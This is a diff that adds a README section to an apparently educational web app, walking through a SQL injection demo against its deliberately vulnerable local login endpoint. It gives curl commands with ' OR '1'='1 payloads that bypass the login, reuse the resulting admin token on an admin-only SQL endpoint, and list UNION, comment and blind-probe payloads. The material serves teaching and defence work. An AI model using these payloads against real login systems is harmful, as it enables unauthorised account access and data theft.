@@ -67,6 +67,107 @@ Default sample logins after seeding:
 
 Generated student accounts follow the same pattern: `studentN / passN`.
 
+## SQL Injection Demonstration Setup
+
+### 1. Configure the backend for the SQLi demo and start the server
+
+Open `backend/app.py` and use these toggles:
+
+- `ENABLE_SQLI_PROTECTION = False` for the unshielded run
+- `ENABLE_SQLI_PROTECTION = True` for the shielded run
+
+For a clean SQLi demo, keep the other protections disabled:
+
+- `ENABLE_DDOS_PROTECTION = False`
+- `ENABLE_AUTH_BYPASS_PROTECTION = False`
+
+Restart the backend server after making these changes.
+
+### 2. Reproduce the vulnerable login bypass with curl
+
+This project's intentionally vulnerable login endpoint is `POST /api/login`.
+The easiest beginner-friendly payload from the test suite is:
+
+- `username = ' OR '1'='1`
+- `password = ' OR '1'='1`
+
+Run this command:
+
+```bash
+curl -s -X POST http://localhost:8000/api/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq .
+```
+
+With `ENABLE_SQLI_PROTECTION = False`, this should return a successful login response with a token.
+That token is effectively admin access in the vulnerable path because the injected query can match the first user row, which is typically the seeded `admin` account.
+
+### 3. Verify which account you received
+
+After the login bypass, inspect the JSON response.
+You should see fields similar to:
+
+- `"message": "Login successful."`
+- `"role": "admin"`
+- `"username": "admin"`
+- `"token": "..."`
+
+If you want to store the token and use it immediately:
+
+```bash
+TOKEN=$(curl -s -X POST http://localhost:8000/api/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq -r '.token')
+```
+
+### 4. Use the token on an admin-only endpoint
+
+```bash
+curl -s -X POST http://localhost:8000/api/admin/action \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"SELECT username, role FROM users LIMIT 5"}' | jq .
+```
+
+With `ENABLE_SQLI_PROTECTION = False`, this demonstrates the impact clearly:
+
+- the SQLi payload logs you in without knowing any real password
+- the response usually identifies you as `admin`
+- the returned token can then be used on admin-only routes
+
+### 5. Try the protected version
+
+Restart the backend after changing:
+
+- `ENABLE_SQLI_PROTECTION = True`
+
+Run the exact same payload again:
+
+```bash
+curl -s -X POST http://localhost:8000/api/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq .
+```
+
+With protection enabled, the request should fail instead of returning a token.
+Depending on the exact payload and username, you should see either a normal login failure or a message such as `Potential SQL injection detected in password.`
+
+### 6. Other beginner-friendly payloads that work in the vulnerable mode
+
+These are already documented in the SQLi test file and can be tried one by one against `/api/login` when `ENABLE_SQLI_PROTECTION = False`:
+
+- Username: `admin' --`
+  Password: `anything`
+- Username: `' UNION SELECT 1,'pwned','pwned@example.com','x','admin','Injected Admin','9999999999' --`
+  Password: `anything`
+- Username: `admin' AND LENGTH(password)=8 --`
+  Password: `anything`
+
+The most reliable and easiest one for demonstration is still:
+
+- Username: `' OR '1'='1`
+- Password: `' OR '1'='1`
+
 ## DOS Attack Demonstration Setup
 
 ### 1. Configure the backend for the DoS demo and start the server
